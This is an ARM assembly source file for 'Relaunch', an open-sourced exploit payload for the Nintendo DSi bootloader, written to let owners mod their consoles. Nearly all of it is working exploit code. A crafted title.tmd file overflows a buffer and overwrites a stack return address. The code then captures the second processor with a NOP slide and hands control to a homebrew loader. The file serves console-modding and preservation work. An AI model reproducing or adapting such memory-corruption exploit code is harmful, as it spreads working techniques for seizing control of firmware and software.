# Relaunch
# An open sourced exploit payload for the weakness unlaunch uses

.syntax unified

################################################################################
#                                                                              #
# Overview of the exploit:                                                     #
#                                                                              #
#     The DSi starts with a bootloader from ROM (stage1) that loads an         #
#     encrypted stage2 bootloader from the eMMC chip inside the DSi            #
#                                                                              #
#     This bootloader will locate and execute the nintendo app-launcher        #
#                                                                              #
#     While the stage2 locates the app-launcher it checks the .tmd file in     #
#     content folder for the launcher to find the app filename.                #
#                                                                              #
#     This is done by retreiving the file length and then reading all of its   #
#     bytes to a fixed address buffer without checking if the buffer csan hold #
#     all that data.                                                           #
#                                                                              #
#     This exploit utilizes the buffer overflow to change a structure located  #
#     after the buffer to overwrite a return pointer on the stack.             #
#           - See Section EXPLOIT near the end                                 #
#                                                                              #
#     The execution on the arm9 then continues at Section Actual Payload       #
#                                                                              #
#     To gain control of the arm7 from the arm9 we use the IWRAM Control       #
#           - See section Gain control of ARM7                                 #
#     to capture the execution flow of the arm7 and jump to an arm7 payload    #
#           - See section ARM7 Payload                                         #
#                                                                              #
#     In the last step, the arm7 is made to execute nds-bootloader from VRAM   #
#     while the arm9 waits in the original passme loop                         #
#                                                                              #
#     nds-bootloader then will do its thing and execute the configured .nds    #
#                                                                              #
################################################################################

@ Written by Tim 'MightyMax' Seidel, 2021
@ Thank you to all the great ppl of the community that lead to understanding
@ the DSi as we do now. 
@
@ This code was written after learning, that the .tmd file could cause a buffer
@ overflow. Unlaunch was not reverse engineered for this. It is likely unalunch 
@ uses the same exploit gadget, but it also could be a different one caused
@ by the very same bug (there are multiple structures overwritten by the tmd)
@
@ The arm7 capture took me the most time. There possibly is an easier method
@ but the IWRAM method works very relyable and even could be reversed, so that
@ the stage2 could restart execution, if the .tmd length bug was patched
@
@ I chosed the easier way of just using the existing nds-bootloader from 
@ devkitPro
@
@ This code is to keep the knowledge open sourced. It is no 'product' or fully
@ completed tool for your DSi. But such a product can be derived from this work.
@ 
@ Martin 'no$cash' Korth originally developed the unlaunch exploit and polished
@ a very well tested and working tool to mod your DSi and shall be used if you 
@ wanted to use the unlaunch exploit for moddign the DSi.
@ In case unlaunch will be gone some time. This source code would allow you to
@ recreate something alike.

###############################
#          Constants          #
###############################

.equ SECTIONBASE        ,0x037df06c
.equ TMD_BASE           ,0x037df06c
.equ TMD_SIZE           ,0x00030000
.equ TMD_WRITECONSTANT  ,0x037F3CC0
.equ TMD_WRITEOFFSET    ,0x00000078
.equ TMD_WRITEPOINTER   ,0x037F3878
.equ TMD_STACKRETURN    ,0x02FE3558
.equ PASSME_ADDRESS     ,0x02FFFE04
.equ PASSME_INSTRUCTION ,0xE59FF018
.equ VRAM_ENTRY         ,0x06000000
.equ VRAM_LCDADDR       ,0x06840000
.equ MRAM_ADDRESS       ,0x02000000

# The exploited code is arm32 
# We could make it return to thumb code but for simplicity all code within here
# is kept as 32 bit

.arm
.global _start

###############################
# BEGIN of the title.tmd file #
###############################

.text
.org (TMD_BASE - SECTIONBASE)

##############################
# Insert original TMD binary #
##############################

_start:
  .incbin "title.org"
 
##############################
# Fill until payload with AA #
############################## 

@ When filling we use a pattern that is easily
@ recognizable. Clearly "AAAAAAAA" stands out in hex view

# .org (0x037f0000 - SECTIONBASE), 0xAA

##############################
#     ! Actual Payload !     #
############################## 
 
entry:

@ With the exploit we got control of the arm9 meaning it executes this code right 
@ now. But we do not have control of the arm7 running in IWRAM owe have no 
@ direct control to
@ We change that and captur the arm7 execution

  BL captureARM7                @ make the arm7 to execute the arm7 payload

@ Set up the passme loop. This was one of the first (or the very first?) exploit
@ for the NDS using the loaded NDS header to create a loop that executes within
@ this .nds file header.
@ the nds-bootloader uses this loop to control the arm9 from within the arm7, by 
@ changing the arm9 entry point and the loop then branching to the new location

  ldr r0, passmeAddress         @ set up the passmeLoop
  ldr r1, passmeInstruction
  str r1, [r0]
  str r0, [r0, #0x20]
  
@ since we have the arm7 now in a loop (see the arm7 payload) we can control,
@ we let it jump to the nds-bootloader in VRAM now by changing the branch target
@ in the arm7 waiting loop
  mov r2, MRAM_ADDRESS
  ldr r1, [r2, (arm7PayloadWait - arm7PayloadStart) + 4]
  str r1, [r2, (arm7PayloadWait - arm7PayloadStart)]
  
@ and finally branching ourself to the passme loop. We are Done.
@ nds-bootloader takes over!
  BX r0
  
  
passmeAddress:
  .word PASSME_ADDRESS
passmeInstruction:
  .word PASSME_INSTRUCTION
  

##############################
#    Gain control of ARM7    #
##############################

@ The Idea to gain control of the arm7 execution is to grab a page of the WRAM 
@ from the arm7 that is not executed, save its data for later and fill it with a
@ NOP slide to branch to payload
@ then we blend it back to the arm7 at a page that will be executed in normal
@ operation (the page the ISRs are in)
@ The arm7 then will fetch the nop slide and branch to the payload
 
captureARM7:
  push {lr}
copyPayload:
  @ Copy arm7 and arm9 main ram payload to main ram
  adr r0, arm7PayloadStart
  adr r1, arm7PayloadEnd
  mov r2, MRAM_ADDRESS
copyPayloadLoop:
  ldr r3, [r0], #4
  str r3, [r2], #4
  cmp r0, r1
  bne copyPayloadLoop
copyBootloader:
  @ set VRAM C LCD
  ldr r0, regVRAMC
  ldr r1, VRAMC_LCD
  strb r1, [r0]
  @ copy to vram
  adr r0, VRAMPayloadStart
  add r1, r0, #32768
  ldr r2, VRAMC_ADDR
copyBootloaderLoop:
  ldrh r3, [r0], #2
  strh r3, [r2], #2
  cmp r0, r1
  bne copyBootloaderLoop
  @ set VRAM C arm7
  ldr r0, regVRAMC
  ldr r1, VRAMC_ARM7
  strb r1, [r0]
setWRAMBaseC:
  @ Set base and end address for bank C (none set yet)
  ldr r0, addrMBK8
  ldr r1, dataMBK8
  str r1,[r0]
getWRAMPage:
  @ Gain Control of 1st Page for ARM9 at offset 0
  ldr r0, addrMBK4
  ldr r1, dataMBK4_ARM9Ctrl
  str r1,[r0]
  ldr r1, dataMBK5_ARM9Ctrl
  str r1,[r0, #4]
clearPage: 
  @ Clear with B self (for now to see where we are)
  mov r0, 0x8000
  sub r0, r0, #4
  mov r1, 0x03800000
  ldr r2, nopSlide
clrLoop:
  str r2, [r1],#4
  subs r0, r0, #4
  bne clrLoop
  ldr r2, nopSlideEnd
  str r2, [r1],#4
postPage:
  @ Set control to arm7 again, so 
  ldr r0, addrMBK4
  ldr r1, dataMBK4_ARM7Ctrl
  ldr r2, dataMBK5_ARM7Ctrl
  str r1,[r0] 
  str r2,[r0, #4] 
waitTillWeAreSureArm7IsCaptured:
  ldr r0, passmeAddress
  mov r1, #0x80000000
  ldr r2, [r0, #-4]
  cmp r2, r1
  bne waitTillWeAreSureArm7IsCaptured
  mov r1, #0x00000000
  str r1, [r0, #-4]
restoreOrigPages:
  ldr r0, addrMBK4
  ldr r1, dataMBK4_Restore
  str r1,[r0]
  ldr r1, dataMBK5_Restore
  str r1,[r0, #4]
testEnd:
  pop {lr}
  BX lr

addrMBK4:
  .word 0x400404C
addrMBK8:
  .word 0x400405C
dataMBK4_ARM9Ctrl:
  .word 0x8D898580
dataMBK5_ARM9Ctrl:
  .word 0x9D999591
dataMBK4_ARM7Ctrl:
  .word 0x8D89859D
dataMBK5_ARM7Ctrl:
  .word 0x80999591
dataMBK4_Restore:
  .word 0x8D898581
dataMBK5_Restore:
  .word 0x9D999591
dataMBK8:
  .word 0x08803800
regVRAMC:
  .word 0x04000242
VRAMC_LCD:
  .word 0x00000080
VRAMC_ARM7:
  .word 0x00000082
VRAMC_ADDR:
  .word VRAM_LCDADDR
  
nopSlide:
  mov r0, MRAM_ADDRESS
nopSlideEnd:
  BX r0
  
##############################
# ARM7 Payload               #
##############################

@ The arm7 payload is quite simple.
@ We will flag a value, that we have entered the payload (so the arm9 knows for
@ sure when to continue)
@ and after that we will wait in a branch to self loop to wait for the arm9
@ to tell us to continue by copying the following instruction over the branch 

arm7PayloadStart:
  ldr r0, passmeAddressArm7
  mov r1, #0x80000000
  str r1, [r0, #-4]
arm7PayloadWait:
  b arm7PayloadWait
  mov pc, VRAM_ENTRY
passmeAddressArm7:
  .word PASSME_ADDRESS
arm7PayloadEnd:

@ We load the VRAM with the nds-bootloader code
@ This code was generated with https://github.com/devkitPro/nds-bootloader
@ using the compiler flag NO_DLDI to load the boot.nds from the DSi SD Card Slot

VRAMPayloadStart:
  .incbin "nds_bootloader.bin"  
VRAMPayloadEnd:
  
##############################
#           EXPLOIT          #
############################## 

# The following lines trigger the exploit
# A function that is called after the .TMD is loaded uses memory that
# is overwritten by the .TMD to write the constant 037F3CC0h at a location we 
# can control.
# Pseudo code:
#   [[037F3878h]+78h] = 037F3CC0h
#
# We will overwrite the return value of that very same function on the stack
# with the constant. Conveniantly the constant is a valid address we have 
# overwritten with the .TMD. 
#
# So with returning from the exploited function, we will start executing 
# from 037F3CC0h

.org (TMD_WRITEPOINTER - SECTIONBASE), 0xAA
  .word TMD_WRITEPOINTER+4                    @ Address of the Pointer used to 
                                              @ write the constant
  .word TMD_STACKRETURN-TMD_WRITEOFFSET       @ Thats the pointer itself, it is 
                                              @ 78h below the target
  
.org (TMD_WRITECONSTANT - SECTIONBASE), 0xAA
  B entry                                     @ We jump away here instantly, as 
                                              @ the following bytes are over-
                                              @ written in the meantime so we 
                                              @ have no control over it, but the 
                                              @ first instruction will be valid
                                              
##############################
#         Pad to 192k        #
############################## 

.org TMD_SIZE - 4, 0xAA
  .word 0xAAAAAAAA
  